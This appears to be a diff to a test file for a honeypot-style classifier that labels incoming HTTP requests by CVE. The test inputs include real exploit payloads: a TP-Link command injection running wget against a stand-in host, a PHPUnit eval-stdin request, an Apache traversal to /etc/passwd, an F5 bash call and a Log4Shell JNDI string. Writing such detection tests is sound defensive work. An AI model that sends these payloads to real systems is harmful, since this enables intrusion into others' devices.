@@ -14,11 +14,23 @@ def test_classify_cve_2024_4577():
     assert exploit == {"classification": "targeted", "stage": "exploit", "cve_id": "CVE-2024-4577"}
 
 
+def test_classify_high_volume_cves():
+    tplink = classify.classify("POST", "/cgi-bin/luci/;stok=/locale?form=country", "country=$(wget http://x/a.sh)")
+    assert tplink == {"classification": "targeted", "stage": "exploit", "cve_id": "CVE-2023-1389"}
+    assert classify.classify("POST", "/cgi-bin/luci/;stok=/locale?form=country", "")["stage"] == "probe"
+    phpunit = classify.classify("POST", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "<?php echo md5('x');")
+    assert phpunit["cve_id"] == "CVE-2017-9841" and phpunit["stage"] == "exploit"
+    apache = classify.classify("GET", "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd", "")
+    assert apache == {"classification": "targeted", "stage": "probe", "cve_id": "CVE-2021-41773"}
+    f5 = classify.classify("POST", "/mgmt/tm/util/bash", '{"command":"run","utilCmdArgs":"-c id"}')
+    assert (f5["classification"], f5["cve_id"]) == ("noise", "CVE-2022-1388")  # recognised, not impersonated
+
+
 def test_classify_noise():
     assert classify.classify("GET", "/", "")["stage"] == "recon"
     assert classify.classify("GET", "/.env", "") == {"classification": "noise", "stage": "probe", "cve_id": None}
-    assert classify.classify("GET", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "")["stage"] == "exploit"
-    assert classify.classify("GET", "/", "", {"User-Agent": "${jndi:ldap://x/a}"})["classification"] == "noise"
+    log4j = classify.classify("GET", "/", "", {"User-Agent": "${jndi:ldap://x/a}"})
+    assert (log4j["classification"], log4j["cve_id"], log4j["stage"]) == ("noise", "CVE-2021-44228", "exploit")
 
 
 def test_ingest_requires_key_and_stores(tmp_path, monkeypatch):
